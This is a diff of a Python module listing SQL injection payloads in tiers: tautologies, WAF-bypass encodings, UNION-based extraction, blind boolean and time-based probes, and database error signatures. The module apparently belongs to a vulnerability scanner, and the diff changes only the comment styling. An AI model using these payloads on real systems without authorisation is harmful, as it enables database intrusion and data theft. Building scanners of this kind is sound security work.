@@ -1,6 +1,6 @@
 """SQL Injection payloads — 3-tier system."""
 
-# -- Tier 1: Fast error-based and tautologies ----------------------------------
+# ── Tier 1: Fast error-based and tautologies ──────────────────────────────────
 SQLI_T1 = [
     "' OR '1'='1",
     "' OR '1'='1'--",
@@ -13,7 +13,7 @@ SQLI_T1 = [
     "1' ORDER BY 3--",
 ]
 
-# -- Tier 2: WAF bypass + encoding variants ------------------------------------
+# ── Tier 2: WAF bypass + encoding variants ────────────────────────────────────
 SQLI_T2 = [
     # URL-encoded apostrophes
     "%27 OR %271%27=%271",
@@ -35,7 +35,7 @@ SQLI_T2 = [
     "%2527 OR %25271%2527=%25271",
 ]
 
-# -- Tier 3: UNION-based extraction --------------------------------------------
+# ── Tier 3: UNION-based extraction ────────────────────────────────────────────
 SQLI_T3 = [
     "' UNION SELECT NULL--",
     "' UNION SELECT NULL,NULL--",
@@ -46,14 +46,14 @@ SQLI_T3 = [
     "' UNION SELECT user(),version(),database()--",
 ]
 
-# -- Blind: Boolean-based ------------------------------------------------------
+# ── Blind: Boolean-based ──────────────────────────────────────────────────────
 SQLI_BLIND = [
     ("' AND 1=1--", "' AND 1=2--"),   # (true, false) pair
     ("' AND 'a'='a'--", "' AND 'a'='b'--"),
     ("' AND SUBSTRING(username,1,1)='a'--", "' AND SUBSTRING(username,1,1)='z'--"),
 ]
 
-# -- Time-based (Oracle decides via elapsed > threshold) -----------------------
+# ── Time-based (Oracle decides via elapsed > threshold) ───────────────────────
 SQLI_TIME = [
     "'; SELECT SLEEP(5)--",           # MySQL
     "'; WAITFOR DELAY '0:0:5'--",     # MSSQL
@@ -63,7 +63,7 @@ SQLI_TIME = [
     "1' AND SLEEP(5) AND '1'='1",
 ]
 
-# -- Response error signatures -------------------------------------------------
+# ── Response error signatures ─────────────────────────────────────────────────
 SQLI_ERRORS = [
     # MySQL
     r"you have an error in your sql syntax",
